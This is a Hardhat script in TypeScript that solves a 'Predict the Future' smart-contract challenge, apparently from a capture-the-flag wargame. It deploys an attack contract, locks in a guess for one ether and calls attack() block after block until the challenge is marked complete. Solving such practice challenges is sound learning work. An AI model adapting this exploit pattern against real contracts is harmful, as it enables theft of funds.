import { utils } from "ethers";
import { ethers } from "hardhat";

const contractAddress = "0x77FDb0585e150903f0d6F0D5dcA881Ac33F68f23";

async function main() {
  const challengeFactory = await ethers.getContractFactory("PredictTheFutureChallenge");
  const challengeContract = challengeFactory.attach(contractAddress);

  console.log("deploying the contract...");
  const attackFactory = await ethers.getContractFactory("PredictTheFutureAttack");
  const attackContract = await attackFactory.deploy(contractAddress);
  await attackContract.deployed();
  console.log(`contract address: ${attackContract.address}`);

  console.log("locking the number...");
  const lockInGuessTx = await attackContract.lockInGuess({
    value: utils.parseEther("1"),
    gasLimit: 100000,
  });
  await lockInGuessTx.wait();

  console.log("guessing the number...");
  while (!(await challengeContract.isComplete())) {
    try {
      const attackTx = await attackContract.attack({ gasLimit: 100000 });
      await attackTx.wait();
    } catch (err) {
      console.log(err);
    }
    const blockNumber = await ethers.provider.getBlockNumber();
    console.log(`Tried block number: ${blockNumber}`);
  }
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
